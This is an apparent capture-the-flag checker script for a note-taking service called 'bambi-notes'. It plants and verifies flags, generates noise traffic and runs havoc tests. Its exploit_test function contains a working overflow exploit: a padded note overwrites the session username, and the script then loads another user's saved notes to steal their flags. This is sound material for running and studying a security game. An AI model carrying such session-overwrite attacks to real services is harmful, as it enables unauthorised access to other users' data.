from asyncio import StreamReader, StreamWriter
import asyncio
import random
import string
import faker

from typing import Optional
from logging import LoggerAdapter

from enochecker3 import (
    ChainDB,
    Enochecker,
    ExploitCheckerTaskMessage,
    FlagSearcher,
    CheckerTaskMessage,
    PutflagCheckerTaskMessage,
    GetflagCheckerTaskMessage,
    PutnoiseCheckerTaskMessage,
    GetnoiseCheckerTaskMessage,
    HavocCheckerTaskMessage,
    MumbleException,
    OfflineException,
    InternalErrorException,
    PutflagCheckerTaskMessage,
    AsyncSocket,
)

from enochecker3.utils import assert_equals, assert_in

class UserExistsException(MumbleException):
    def __init__(self):
        super().__init__("Registration Failed!")

class InvalidCredentialsException(MumbleException):
    def __init__(self):
        super().__init__("Login Failed!")

SERVICE_PORT = 8204
checker = Enochecker("bambi-notes", SERVICE_PORT)
app = lambda: checker.app

CHARSET = string.ascii_letters + string.digits + "_-"

BANNER = b"Welcome to Bambi-Notes!\n"
DEFAULT_NOTE = b"Well, it's a note-taking service. What did you expect?"

FAKER = faker.Faker(faker.config.AVAILABLE_LOCALES)

def gen_rando_bs(max_len = 0x30):
    if random.getrandbits(1):
        rando_str = FAKER.bs()
    else:
        rando_str = FAKER.catch_phrase()
    return rando_str.encode()[:max_len]

class BambiNoteClient():
    UNAUTHENTICATED = 0
    
    state: "int | tuple[str, str]"
    task: CheckerTaskMessage
    reader: StreamReader
    writer: StreamWriter

    def __init__(self, task, logger : Optional[LoggerAdapter]=None) -> None:
        self.state = self.UNAUTHENTICATED
        self.task = task
        self.logger = logger

    async def __aenter__(self):
        try:
            self.reader, self.writer = await asyncio.open_connection(self.task.address, SERVICE_PORT) 
        except:
            raise OfflineException("Failed to establish a service connection!")

        self.logger.info("Connected!")
        await self.readuntil(BANNER)
        return self

    async def __aexit__(self, *args):
        self.writer.close()
        await self.writer.wait_closed()

    async def assert_authenticated(self):
        if self.state == BambiNoteClient.UNAUTHENTICATED:
            raise InternalErrorException("Trying invoke authenticated method in unauthenticated context")

    async def check_prompt(self):
        pass
    
    def debug_log(self, *args, **kwargs):
        if self.logger is not None:
            self.logger.debug(*args, **kwargs)

    async def readuntil(self, separator=b'\n', *args, **kwargs):
        self.debug_log(f"reading until {separator}")
        try:
            result = await self.reader.readuntil(separator, *args, **kwargs)
        except Exception as e:
            self.debug_log(f"Failed client readuntil: {e}")
            raise

        self.debug_log(f">>>\n {result}")
        return result

    async def readline(self):
        return await self.readuntil(b'\n')

    async def write(self, data: bytes):
        self.debug_log(f"<<<\n{data}")
        self.writer.write(data)
        await self.writer.drain()
    
    async def read_menu(self):
        if self.state == BambiNoteClient.UNAUTHENTICATED:
            try:
                await self.readuntil( b"===== [Unauthenticated] =====\n" )
                assert_equals( await self.readline(), b"   1. Register\n" ) 
                assert_equals( await self.readline(), b"   2. Login\n" ) 

            except:
                raise MumbleException("Failed to fetch unauthenticated Menu!")

        else:
            try:
                await self.readuntil( f"===== [{self.state[0]}] =====".encode())
                assert_equals( await self.readline(), b"   1. Create\n" ) 
                assert_equals( await self.readline(), b"   2. Print\n" ) 
                assert_equals( await self.readline(), b"   3. List Saved\n" ) 
                assert_equals( await self.readline(), b"   4. Delete\n" ) 
                assert_equals( await self.readline(), b"   5. Load\n" ) 
                assert_equals( await self.readline(), b"   6. Save\n" ) 

            except: 
                raise MumbleException("Failed to fetch authenticated Menu!")

    async def register(self, username, password):
        if self.state != BambiNoteClient.UNAUTHENTICATED:
            raise InternalErrorException("We're already authenticated")

        await self.readuntil(b"> ")
        
        await self.write(b"1\n")
        
        await self.readuntil(b"Username:\n> ")
        await self.write(username.encode() + b"\n")
        
        await self.readuntil(b"Password:\n> ")
        await self.write(password.encode() + b"\n")
        
        await self.readuntil(b"Registration successful!\n")
        self.state = (username, password)
    
    
    async def login(self, username, password):
        if self.state != BambiNoteClient.UNAUTHENTICATED:
            raise InternalErrorException("We're already authenticated")

        await self.readuntil(b"> ")
        await self.write(b"2\n")
        
        line = await self.readuntil(b"> ")
        assert_equals(line, b"Username:\n> ", "Login Failed!")
        await self.write(username.encode() + b"\n")
        
        line = await self.readline()
        try:
            assert_equals(line, b"Password:\n", "Login Failed!")
        except:
            raise InvalidCredentialsException
        await self.readuntil(b"> ")
        await self.write(password.encode() + b"\n")
        
        line = await self.readline()
        if line != b"Login successful!\n":
            raise InvalidCredentialsException()

        self.state = (username, password)

    async def create_note(self, idx: int, note_data: bytes):
        if self.state == BambiNoteClient.UNAUTHENTICATED:
            raise InternalErrorException("Trying invoke authenticated method in unauthenticated context")
        
        prompt = await self.readuntil(b"> ")
        await self.write(b"1\n")
        
        prompt = await self.readuntil(b"> ")
        assert_equals(prompt, b"Which slot to save the note into?\n> ", "Failed to create a new note")
        await self.write(f"{idx}\n".encode())
                
        prompt = await self.readline()
        assert_equals(prompt, f"Note [{idx}]\n".encode(), "Failed to create a new note")
        prompt = await self.reader.readexactly(2)
        assert_equals(prompt, b"> ", "Failed to create a new note")

        await self.write(note_data + b"\n")
        
        line = await self.readline()
        assert_equals(line, b"Note Created!\n", "Failed to create a new note")

    async def list_notes(self):
        self.assert_authenticated()

        notes = {}
        notes['saved'] = []

        prompt = await self.readuntil(b"> ")
        await self.write(b"3\n")
        
        await self.readuntil(f"\n\n===== [{self.state[0]}'s Notes] =====\n".encode())
        
        line = await self.readline()
        if line == b"Currently Loaded:\n":
            while True:
                line = await self.readline()
                
                if line == b"Saved Notes:\n":
                    break

                if line == b"===== [End of Notes] =====\n":
                    self.logger.info(f"Note list: {notes}")
                    return notes
                
                assert_equals(line[:4], b"    ", "Failed to list Notes!")
                assert_equals(line[-1], 0xa,     "Failed to list Notes!")
                idx, text = (line[4:-1].split(b" | ", maxsplit=1))
                
                try:
                    notes[int(idx)] = text
                except ValueError:
                    raise MumbleException("Failed to list Notes!")

        if line == b"Saved Notes:\n":
            while True:
                line = await self.readline()
                if line == b"===== [End of Notes] =====\n":
                    self.logger.info(f"Note list: {notes}")
                    return notes

                assert_equals(line[:3], b" | ", "Failed to list Notes!")
                filename = line[3:-1]
                notes['saved'].append(filename)
        
        self.logger.info(f"Note list: {notes}")
        return notes

    async def delete_note(self, idx):
        self.assert_authenticated()
        
        prompt = await self.readuntil(b"> ")
        await self.write(b"4\n")
        
        line = await self.readline()
        assert_equals(line, b"<Idx> of Note to delete?\n", "Failed to delete Note!")
        prompt = await self.readuntil(b"> ")
        assert_equals(prompt, b"> ", "Failed to delete Note!")

        await self.write(f"{idx}\n".encode())

        line = await self.readline()
        assert_equals(line, b"Note deleted!\n", "Failed to delete Note!")

    async def load_note(self, idx: int, filename: str):
        self.assert_authenticated()
        
        prompt = await self.readuntil(b"> ")
        await self.write(b"5\n")
        
        prompt = await self.readuntil(b"> ")
        assert_equals(prompt, b"Which note to load?\nFilename > ", "Failed to delete Note!")
        await self.write(f"{filename}\n".encode())
        
        prompt = await self.readuntil(b"> ")
        assert_equals(prompt, b"Which slot should it be stored in?\n> ")
        await self.write(f"{idx}\n".encode())
        
    async def save_note(self, idx: int, filename: str):
        self.assert_authenticated()

        prompt = await self.readuntil(b"> ")
        await self.write(b"6\n")
        
        prompt = await self.readuntil(b"> ")
        assert_equals( prompt, b"Which note to save?\n> ", "Failed to save Note!")
        await self.write(f"{idx}\n".encode())
        
        line = await self.readline()
        assert_equals(line, b"Which file to save into?\n", "Failed to save Note!")
        prompt = await self.readuntil(b"> ")
        assert_equals(prompt, b"Filename > ", "Failed to save Note!")
        await self.write(f"{filename}\n".encode())
        
        line = await self.readline()
        assert_equals(line, b"Note saved!\n", "Failed to save Note!")


def gen_random_str(k=16):
    return ''.join(random.choices(CHARSET, k=k))

def generate_creds(exploit_fake=False, namelen=16):
    # if exploit_fake
    username = ''.join(random.choices(CHARSET, k=namelen))
    password = ''.join(random.choices(CHARSET, k=namelen))
    return (username, password)

@checker.putflag(0)
async def putflag_test(
    task: PutflagCheckerTaskMessage,
    db: ChainDB,
    logger: LoggerAdapter
) -> None:

    logger.debug("TESTTEST123!")
    username, password = generate_creds()
    idx = random.randint(1, 9)
    filename = gen_random_str()
    await db.set("flag_info", (username, password, idx, filename))
    
    async with BambiNoteClient(task, logger) as client:
        await client.register(username, password)
        await client.create_note(idx, task.flag.encode())
        await client.save_note(idx, filename)

    return username

@checker.getflag(0)
async def getflag_test(
    task: GetflagCheckerTaskMessage, db: ChainDB, logger: LoggerAdapter
) -> None:
    try:
        username, password, _, filename = await db.get("flag_info")
    except KeyError:
        raise MumbleException("Missing database entry from putflag")

    idx = random.randint(1,9)
    async with BambiNoteClient(task, logger) as client:
        await client.login(username, password)
        await client.load_note(idx, filename)

        note_list = await client.list_notes()
        try:
            assert note_list[idx] == task.flag.encode()
        except:
            raise MumbleException("Flag not found!") 
        

@checker.putnoise(0)
async def putnoise0(task: PutnoiseCheckerTaskMessage, db: ChainDB, logger: LoggerAdapter):
    (username, password) = generate_creds()
    idx = random.randint(0,9)
    note = gen_rando_bs(max_len=0x38)
    filename = gen_random_str()

    await db.set('noise_info', (username, password, note, filename))
    async with BambiNoteClient(task, logger) as client:
        await client.register(username, password)

        if random.getrandbits(1):
            await client.list_notes()

        low_bound = 1
        if random.getrandbits(1):
            await client.delete_note(0)
            low_bound = 0
            if random.getrandbits(1):
                await client.list_notes()

            
        random_idx = random.randint(low_bound,9)
        await client.create_note(random_idx, note)
        
        if random.getrandbits(1):
            notes = await client.list_notes()
            assert_equals(note, notes[random_idx], "Note not in list!")
        
        await client.save_note(random_idx, filename)
        
@checker.getnoise(0)
async def getnoise0(task: GetnoiseCheckerTaskMessage, db: ChainDB, logger: LoggerAdapter):
    try:
        (username, password, note, filename) = await db.get('noise_info')
    except:
        raise MumbleException("Putnoise Failed!") 

    random_idx = random.randint(0,9)
    async with BambiNoteClient(task, logger) as client:
        await client.login(username, password)
        
        if random.getrandbits(1):
            note_list = await client.list_notes()
            if filename.encode() not in note_list["saved"]:
                logger.warn(f'"{filename}" not found in note_list {note_list}!')
                raise MumbleException("Failed to find note on disk!")

        await client.load_note(random_idx, filename)
        notes = await client.list_notes()
        assert_equals(note, notes[random_idx], "Note not in list!")
        
        if random.getrandbits(1):
            await client.delete_note(random_idx)


# Save multiple files
@checker.putnoise(1)
async def putnoise1(task: PutnoiseCheckerTaskMessage, db: ChainDB, logger: LoggerAdapter):
    (username, password) = generate_creds()

    #genrerate a few random_idxes
    random_idx = [random.randint(0,9) for _ in range(random.randint(1,10))]
    random_idx = list(dict.fromkeys(random_idx))
    
    notes = [ gen_rando_bs(max_len=0x38) for _ in random_idx]
    filenames = [gen_random_str() for _ in random_idx]
    await db.set('noise_info', (username, password, notes, filenames))

    async with BambiNoteClient(task, logger) as client:
        await client.register(username, password)
        if random.getrandbits(1):
            await client.list_notes()

        for idx, note in zip(random_idx, notes):
            if idx == 0:
                await client.delete_note(idx)
            await client.create_note(idx, note)

        if random.getrandbits(1):
            note_list = await client.list_notes()
            try:
                for idx, note in zip(random_idx, notes):
                    assert note_list[idx] == note
            except:
                logger.warn(f'{note} ({idx}) not found in note_list {note_list}!')
                raise MumbleException("Note not in list!")

        for idx, filename in zip(random_idx, filenames):
            await client.save_note(idx, filename)

        if random.getrandbits(1):
            note_list = await client.list_notes()
            try:
                for idx, note in zip(random_idx, notes):
                    assert note_list[idx] == note
                for filename in filenames:
                    assert filename.encode() in note_list['saved']
            except:
                logger.warn(f'"{filename}" not found in note_list["saved"]: {note_list}!')
                raise MumbleException("Note not in list!")

def assert_notelist_matches(subset, actual):
    try:
        for idx in range(10):
            if idx in subset:
                assert subset[idx] == actual[idx]
        
        for elem in subset["saved"]:
            assert elem in actual["saved"]
    except:
        raise MumbleException("Notelist differs!")

@checker.getnoise(1)
async def getnoise1(task: GetnoiseCheckerTaskMessage, db: ChainDB, logger: LoggerAdapter):
    try:
        username, password, notes, filenames = await db.get("noise_info")
    except:
        raise MumbleException("Putnoise failed!")

    # Select a few notes to randomly check
    note_count_to_check = random.randint(1, len(filenames))
    note_nums = random.choices(list(range(len(filenames))), k=note_count_to_check)
    
    note_list_expected = {
        0: DEFAULT_NOTE,
        'saved': [b".", b"..", *[filename.encode() for filename in filenames]]
    }

    async with BambiNoteClient(task, logger) as client:
        await client.login(username, password)

        # Cover as put*
        if random.getrandbits(1):
            note_text = gen_rando_bs()
            rando_note_idx = random.randint(1, 9)
            await client.create_note(rando_note_idx, note_text)
            note_list_expected[rando_note_idx] = note_text

        # Incrementally load notes into mem and randomly list them!
        for note_idx in note_nums:
            if random.getrandbits(1):
                note_list = await client.list_notes()

                # Doesn't work since there may be additional notes from players!
                # if note_list_expected != note_list:
                #     raise MumbleException("Notes differ!")
                logger.info(f"Notelist match:\nexpected: {note_list_expected}\ngot:{note_list}")
                assert_notelist_matches(note_list_expected, note_list)

            # Rarely load the password as a note to annoy teams
            if random.getrandbits(4) == 0:
                rando_idx = random.randint(0, 9)
                await client.load_note(rando_idx, "passwd")
                note_list_expected[rando_idx] = password.encode()

            rando_idx = random.randint(0, 9)
            # Already Occupied! (load note doesn't care, but we'll randomly delete them sometimes)
            if rando_idx in note_list_expected:
                if random.getrandbits(1):
                    await client.delete_note(rando_idx)
                    del note_list_expected[rando_idx]

            await client.load_note(rando_idx, filenames[note_idx])
            note_list_expected[rando_idx] = notes[note_idx]


## Fail Login repeatedly
@checker.havoc(0)
async def havoc0(task: HavocCheckerTaskMessage, logger: LoggerAdapter):
    async with BambiNoteClient(task, logger) as client:
        for i in range(10):
            username, password = generate_creds()
            try: 
                await client.login(username, password) 
            except InvalidCredentialsException:
                continue
            break

## Delete Note
@checker.havoc(1)
async def havoc1(task: HavocCheckerTaskMessage, logger: LoggerAdapter):
    # async with BambiNoteClient(task, logger) as client:
    #     await client.login()
    pass

# 1337
@checker.havoc(2)
async def havoc2(task: HavocCheckerTaskMessage, logger: LoggerAdapter):
    async with BambiNoteClient(task, logger) as client:
        await client.read_menu()
        await client.readuntil(b"> ")
        await client.write(b"1337\n")

        assert_equals(await client.readline(), b"Nice Try!\n", "L33T text not available!")
        assert_equals(await client.readline(), b"Yeah this isn't going to do anything\n", "L33T text not available!")

@checker.exploit(0)
async def exploit_test(task: ExploitCheckerTaskMessage, searcher: FlagSearcher, sock: AsyncSocket, logger:LoggerAdapter) -> Optional[str]:
    username, password = generate_creds()
    async with BambiNoteClient(task, logger) as client:
        await client.register(username, password)
        await client.create_note(5, b"A" * 0x40 + task.attack_info.encode())
        await client.save_note(5, "exploit_123")
        await client.load_note(0, "exploit_123")

        client.state = (task.attack_info, client.state[1])
        notes = await client.list_notes()

        note_ctr = 1
        for note in notes['saved']:
            if note == b"." or note == b"..":
                continue
            
            logger.info(f"loading NOTE {note_ctr}, filename: {note}")
            await client.load_note(note_ctr, note.decode())
            notes = await client.list_notes()
            logger.info(f"{notes}")
            foo = searcher.search_flag(notes[1]) 
            if foo is not None:
                return foo

if __name__ == "__main__":
    checker.run()